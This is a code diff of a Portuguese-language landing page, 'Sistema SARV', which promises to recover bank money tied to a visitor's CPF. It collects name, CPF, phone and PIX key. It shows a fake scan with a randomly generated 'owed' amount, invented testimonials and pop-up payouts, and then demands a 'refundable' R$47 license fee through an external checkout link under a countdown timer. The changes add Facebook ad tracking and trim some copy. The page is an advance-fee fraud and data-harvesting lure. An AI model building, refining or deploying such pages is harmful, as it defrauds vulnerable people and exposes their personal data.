@@ -5,6 +5,21 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Sistema SARV - Auditoria Oficial</title>
     
+    <script>
+    !function(f,b,e,v,n,t,s)
+    {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+    n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+    if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+    n.queue=[];t=b.createElement(e);t.async=!0;
+    t.src=v;s=b.getElementsByTagName(e)[0];
+    s.parentNode.insertBefore(t,s)}(window, document,'script',
+    'https://connect.facebook.net/en_US/fbevents.js');
+    fbq('init', '1773918999950681');
+    fbq('track', 'PageView');
+    </script>
+    <noscript><img height="1" width="1" style="display:none"
+    src="https://www.facebook.com/tr?id=1773918999950681&ev=PageView&noscript=1"
+    /></noscript>
     <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;600;700;800;900&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
 
@@ -15,6 +30,7 @@
             --text: #1a1a1a; 
             --bg: #f4f7f9; 
             --danger: #e11d48;
+            --dark-blue: #002d62;
         }
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Montserrat', sans-serif; }
         body { background-color: var(--bg); color: var(--text); overflow-x: hidden; }
@@ -31,8 +47,8 @@
         .container { max-width: 500px; margin: 0 auto; padding: 20px; }
 
         .hero { text-align: center; margin-bottom: 20px; }
-        .hero h1 { font-size: 26px; font-weight: 900; line-height: 1.1; color: var(--danger); margin-top: 15px; }
-        .hl-blue { color: var(--primary); }
+        .hero h1 { font-size: 26px; font-weight: 900; line-height: 1.2; color: var(--dark-blue); margin-top: 15px; }
+        mark { background-color: #ffeb3b; color: inherit; padding: 0 4px; border-radius: 4px; }
 
         .roberto-box { background: #fff; border-radius: 15px; padding: 20px; border: 1px solid #ddd; margin-bottom: 25px; box-shadow: 0 4px 10px rgba(0,0,0,0.05); }
         .roberto-header { display: flex; align-items: center; gap: 15px; margin-bottom: 15px; }
@@ -109,7 +125,7 @@
         <div id="step-1">
             <section class="hero">
                 <p style="font-size: 13px; font-weight: 800; color: #999;">Por: Roberto Menezes — Ex-Auditor Sênior</p>
-                <h1>Recupere o saldo que os bancos <span class="hl-blue">esconderam de você</span></h1>
+                <h1>Recupere <mark>valores</mark> vinculados ao seu cpf</h1>
                 <p style="font-size: 14px; color: #000; margin-top: 12px; font-weight: 700;">Consulta 100% gratuita usando seu CPF. Em menos de 1 minuto você descobre quanto o banco está te devendo.</p>
             </section>
 
@@ -139,10 +155,6 @@
                     <input type="tel" id="zap" placeholder="(00) 00000-0000">
                 </div>
                 <button class="btn-main" onclick="startScanner()">🔍 CONSULTAR MEU SALDO AGORA</button>
-                
-                <p style="font-size: 11px; font-weight: 700; color: #666; text-align: center; margin-top: 15px;">
-                    * Atenção: Os valores variam e são intercalados conforme o histórico de cada CPF.
-                </p>
             </div>
 
             <div class="stats-grid">
@@ -155,32 +167,27 @@
             
             <div id="depo-container">
                 <div class="card-depo">
-                    <div class="depo-header"><b>Cleusa Aparecida dos Santos</b> <span>Goiânia - GO (12/05/2026)</span></div>
+                    <div class="depo-header"><b>Cleusa Aparecida dos Santos</b> <span>Goiânia - GO</span></div>
                     <div class="val-rec">+R$ 2.340,42</div>
-                    <p class="depo-text">"Fiquei com medo no começo, achei que era golpe. Mas minha filha me ajudou a fazer e caiu R$ 2.340,42 do Bradesco que eu nem sabia que tinha. Deus abençoe esse moço Roberto."</p>
-                </div>
-                <div class="card-depo">
-                    <div class="depo-header"><b>Antônio Ferreira da Silva Neto</b> <span>Recife - PE (12/05/2026)</span></div>
-                    <div class="val-rec">+R$ 2.810,89</div>
-                    <p class="depo-text">"Trabalhei 40 anos de carteira assinada. O scanner achou R$ 2.810,89 que tava parado. Caiu no PIX em 12 minutos como prometido."</p>
+                    <p class="depo-text">"Fiquei com medo no começo. Mas minha filha me ajudou a fazer e caiu R$ 2.340,42 que eu nem sabia que tinha."</p>
                 </div>
             </div>
 
             <button class="btn-more" id="btn-load-more" onclick="loadMoreDepos()">Ver mais depoimentos</button>
 
             <div class="steps">
-                <div class="depo-title" style="border:none; padding:0;">Como funciona — passo a passo:</div>
+                <div class="depo-title" style="border:none; padding:0;">Como funciona:</div>
                 <div class="step-item">
                     <div class="step-num">1</div>
-                    <div class="step-info"><b>Consulta Gratuita</b><p style="color: #666;">Nosso scanner varre 14 instituições bancárias em tempo real usando seu CPF.</p></div>
+                    <div class="step-info"><b>Consulta Gratuita</b><p style="color: #666;">Scanner varre 14 instituições em tempo real.</p></div>
                 </div>
                 <div class="step-item">
                     <div class="step-num">2</div>
-                    <div class="step-info"><b>Cálculo de Tarifas</b><p style="color: #666;">Localizamos cobranças indevidas e juros acumulados em contas ativas ou inativas.</p></div>
+                    <div class="step-info"><b>Cálculo</b><p style="color: #666;">Localizamos juros acumulados em contas.</p></div>
                 </div>
                 <div class="step-item">
                     <div class="step-num">3</div>
-                    <div class="step-info"><b>Saque Imediato</b><p style="color: #666;">Após a emissão da licença, o valor é transferido para sua chave PIX escolhida.</p></div>
+                    <div class="step-info"><b>Saque</b><p style="color: #666;">Valor transferido para sua chave PIX.</p></div>
                 </div>
                 <button class="btn-main" style="margin-top:20px;" onclick="document.getElementById('main-form').scrollIntoView({behavior: 'smooth'})">🔍 CONSULTAR MEU SALDO AGORA</button>
             </div>
@@ -193,16 +200,12 @@
                 <p style="font-size: 13px; margin-bottom: 20px;">Aguarde, <span class="u-nome" style="font-weight: 800;"></span></p>
                 
                 <div style="text-align: left; background: #fafafa; border-radius: 12px; padding: 15px; border: 1px solid #eee;">
-                    <p style="font-size: 11px; font-weight: 800; color: var(--primary); margin-bottom: 10px;">Verificando bancos vinculados ao CPF: <span id="u-cpf"></span></p>
+                    <p style="font-size: 11px; font-weight: 800; color: var(--primary); margin-bottom: 10px;">Verificando CPF: <span id="u-cpf"></span></p>
                     <div id="b-list">
                         <div class="bank-item" data-time="1500"><span>Banco do Brasil</span> <small>aguardando</small></div>
-                        <div class="bank-item" data-time="3200"><span>Caixa Econômica</span> <small>aguardando</small></div>
-                        <div class="bank-item" data-time="2800"><span>Bradesco</span> <small>aguardando</small></div>
-                        <div class="bank-item" data-time="3500"><span>Itaú Unibanco</span> <small>aguardando</small></div>
-                        <div class="bank-item" data-time="3800"><span>Santander</span> <small>aguardando</small></div>
+                        <div class="bank-item" data-time="2000"><span>Caixa Econômica</span> <small>aguardando</small></div>
                         <div class="bank-item" data-time="1200"><span>Nubank</span> <small>aguardando</small></div>
-                        <div class="bank-item" data-time="1000"><span>Banco Inter</span> <small>aguardando</small></div>
-                        <div class="bank-item" data-time="1100"><span>Mercado Pago</span> <small>aguardando</small></div>
+                        <div class="bank-item" data-time="1000"><span>Mercado Pago</span> <small>aguardando</small></div>
                     </div>
                 </div>
             </div>
@@ -226,26 +229,18 @@
 
                 <div class="audit-details">
                     <div class="audit-line"><span>Instituições Consultadas:</span> <b>14 Bancos</b></div>
-                    <div class="audit-line"><span>Tarifas Indevidas Localizadas:</span> <b>R$ <span id="val-tarifas"></span></b></div>
-                    <div class="audit-line"><span>Juros de Contas Inativas:</span> <b>R$ <span id="val-juros"></span></b></div>
-                    <div class="audit-line" style="margin-top:10px; padding-top:10px; border-top: 1px solid #eee;"><span>Status do Saque:</span> <b style="color:var(--secondary)">LIBERADO</b></div>
+                    <div class="audit-line"><span>Status do Saque:</span> <b style="color:var(--secondary)">LIBERADO</b></div>
                 </div>
 
                 <div class="pix-container">
-                    <label>Selecione seu banco:</label>
-                    <select id="banco-select" style="margin-bottom: 10px;">
-                        <option value="">Escolher instituição...</option>
-                        <option>Nubank</option><option>Inter</option><option>C6 Bank</option><option>PagBank</option><option>PicPay</option><option>Mercado Pago</option><option>Itaú</option><option>Bradesco</option><option>Santander</option><option>Caixa</option><option>Banco do Brasil</option>
-                    </select>
                     <label>Sua Chave PIX:</label>
                     <input type="text" placeholder="CPF, E-mail ou Celular...">
                 </div>
 
                 <h3 style="color: #ff0000; font-size: 18px; font-weight: 900; text-align: center; margin: 25px 0 15px;">⚠️ ÚLTIMA ETAPA: ATIVAÇÃO DA LICENÇA</h3>
                 
-                <div style="font-size: 15px; line-height: 1.6; color: #333; margin-bottom: 20px; text-align: center; background: #fffdf0; padding: 15px; border: 1px solid #ffeeba; border-radius: 12px;">
-                    <span class="u-nome" style="font-weight: 800;"></span>, para garantir que o saque seja feito pelo titular do CPF e evitar fraudes, é necessário ativar sua <b>Licença de Auditoria Individual</b>.<br><br>
-                    <b>IMPORTANTE:</b> O valor da licença de R$ 47,00 é 100% REEMBOLSÁVEL e será devolvido automaticamente somado ao seu saque total de <b class="f-money-txt"></b>.
+                <div style="font-size: 14px; line-height: 1.6; color: #333; margin-bottom: 20px; text-align: center; background: #fffdf0; padding: 15px; border: 1px solid #ffeeba; border-radius: 12px;">
+                    Ative sua <b>Licença de Auditoria Individual</b> para liberar o saque. O valor de R$ 47,00 é 100% REEMBOLSÁVEL e será devolvido somado ao seu saque total de <b class="f-money-txt"></b>.
                 </div>
 
                 <div style="background: #fff; border: 2px solid var(--secondary); border-radius: 15px; padding: 20px; text-align: center; margin-bottom: 25px;">
@@ -253,25 +248,21 @@
                     <div style="font-size: 42px; font-weight: 900; color: var(--secondary);">R$ 47,00</div>
                     <div style="display:flex; justify-content: space-around; margin-top: 15px; padding-top: 15px; border-top: 1px solid #eee;">
                         <div><span style="display:block; font-size: 12px; color: #999; font-weight:800;">Encerra em</span><b style="color:#ff0000; font-size: 18px;" id="timer">05:00</b></div>
-                        <div><span style="display:block; font-size: 12px; color: #999; font-weight:800;">Saque no CPF</span><b style="font-size: 18px;">DISPONÍVEL (1)</b></div>
                     </div>
                 </div>
 
-                <a href="https://checkoutseguro.ru/checkout/cmnap6rte03461ro96zchoops?offer=DMBCE7O" class="btn-main" style="text-decoration: none; display: block; text-align: center; font-size: 18px;">🔓 LIBERAR MEU SAQUE AGORA</a>
+                <a href="https://checkoutseguro.ru/checkout/cmnap6rte03461ro96zchoops?offer=DMBCE7O" 
+                   onclick="fbq('track', 'InitiateCheckout');"
+                   class="btn-main" 
+                   style="text-decoration: none; display: block; text-align: center; font-size: 18px;">🔓 LIBERAR MEU SAQUE AGORA</a>
 
-                <div class="roberto-box" style="margin-top: 25px; background: #fdfdfd; border-color: var(--danger);">
-                     <p style="font-size: 14px; color: #111; line-height: 1.6; font-weight: 600;">
-                        <b>Eu estou te avisando:</b> "<span class="u-nome"></span>, essa é a nossa última chamada. Garanta sua licença agora, receba seus <b class="f-money-txt"></b> e tenha os 47 reais devolvidos no mesmo PIX. Não deixe o banco ficar com o que é seu por direito."
-                    </p>
-                </div>
             </div>
         </div>
 
         <footer class="footer">
-            <b>VALORES ENVIADOS PELO BANCO CENTRAL DO BRASIL</b><br>
-            Sistema SARV TECNOLOGIA LTDA | CNPJ: 42.184.291/0001-08<br>
-            Suporte: pessoal.robertomenezes@gmail.com<br>
-            © 2026 Sistema SARV — Todos os direitos reservados.
+            Sistema SARV — Painel de Verificação Financeira<br>
+            Ambiente protegido • Consulta criptografada<br>
+            © 2026 SARV Sistema de Auditoria
         </footer>
     </div>
 
@@ -292,43 +283,19 @@
 
         const usersPop = [
             {n: "João Pedro Silva", c: "São Paulo/SP"}, {n: "Maria Lucia Souza", c: "Curitiba/PR"},
-            {n: "Ricardo Pereira Mendes", c: "Belo Horizonte/MG"}, {n: "Ana Beatriz Lima", c: "Rio de Janeiro/RJ"},
-            {n: "Marcos Oliveira Souza", c: "Osasco/SP"}, {n: "Fernanda Cavalcante", c: "Manaus/AM"},
-            {n: "Sérgio Ramos da Costa", c: "Porto Alegre/RS"}, {n: "Adriana Lima Costa", c: "Salvador/BA"},
-            {n: "Bruno Henrique Rocha", c: "Campinas/SP"}, {n: "Camila Rodrigues Silva", c: "Santos/SP"},
-            {n: "Diego Santos", c: "Recife/PE"}, {n: "Eduardo Silva", c: "Brasília/DF"},
-            {n: "Lucas Alencar", c: "Manaus/AM"}, {n: "Felipe Neves", c: "Goiânia/GO"},
-            {n: "Tiago Lima", c: "Vitória/ES"}, {n: "Gustavo Melo", c: "Cuiabá/MT"},
-            {n: "Juliana Mendes", c: "Brasília/DF"}, {n: "Patrícia Souza", c: "Natal/RN"},
-            {n: "Letícia Santos", c: "Florianópolis/SC"}, {n: "Aline Silva", c: "João Pessoa/PB"}
+            {n: "Ricardo Pereira Mendes", c: "Belo Horizonte/MG"}, {n: "Ana Beatriz Lima", c: "Rio de Janeiro/RJ"}
         ];
         
         function showNotification() {
             const user = usersPop[Math.floor(Math.random() * usersPop.length)];
             const val = (Math.random() * (2890 - 1100) + 1100).toLocaleString('pt-BR', {minimumFractionDigits: 2, maximumFractionDigits: 2});
-            document.getElementById('notif-name').innerText = `${user.n} - ${user.c}`;
+            document.getElementById('notif-name').innerText = `${user.n}`;
             document.getElementById('notif-money').innerText = `R$ ${val} via PIX`;
             const box = document.getElementById('notification-box');
             box.classList.add('show');
             setTimeout(() => box.classList.remove('show'), 8000);
         }
         setInterval(showNotification, 18000);
-
-        function loadMoreDepos() {
-            const container = document.getElementById('depo-container');
-            const novos = [
-                {n: "Marcos Oliveira Souza", l: "Osasco - SP (12/05/2026)", v: "1.890,22", t: "Paguei a licença de 47 e o valor caiu na hora. O estorno veio junto no mesmo PIX. Vale a pena."},
-                {n: "Fernanda Lima de Souza", l: "Curitiba - PR (12/05/2026)", v: "2.765,45", t: "Sistema muito fácil de usar. Achei dinheiro de uma conta que fechei em 2018. Muito obrigada!"},
-                {n: "Ricardo Mendes da Rocha", l: "Vitória - ES (12/05/2026)", v: "1.250,12", t: "Acabei de receber. O processo é rápido e o suporte por e-mail me ajudou. Recomendo."}
-            ];
-            novos.forEach(d => {
-                const div = document.createElement('div');
-                div.className = 'card-depo';
-                div.innerHTML = `<div class="depo-header"><b>${d.n}</b> <span>${d.l}</span></div><div class="val-rec">+R$ ${d.v}</div><p class="depo-text">"${d.t}"</p>`;
-                container.appendChild(div);
-            });
-            document.getElementById('btn-load-more').style.display = 'none';
-        }
 
         async function startScanner() {
             const nome = document.getElementById('nome').value;
@@ -356,8 +323,6 @@
             const min = 1100; const max = 2890;
             const total = Math.random() * (max - min) + min;
             const sorteio = total.toLocaleString('pt-BR', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
-            document.getElementById('val-tarifas').innerText = (total * 0.6).toLocaleString('pt-BR', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
-            document.getElementById('val-juros').innerText = (total * 0.4).toLocaleString('pt-BR', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
             document.getElementById('f-money').innerText = "R$ " + sorteio;
             document.querySelectorAll('.f-money-txt').forEach(el => el.innerText = "R$ " + sorteio);
             document.getElementById('f-cpf').innerText = "CPF: " + document.getElementById('cpf').value;
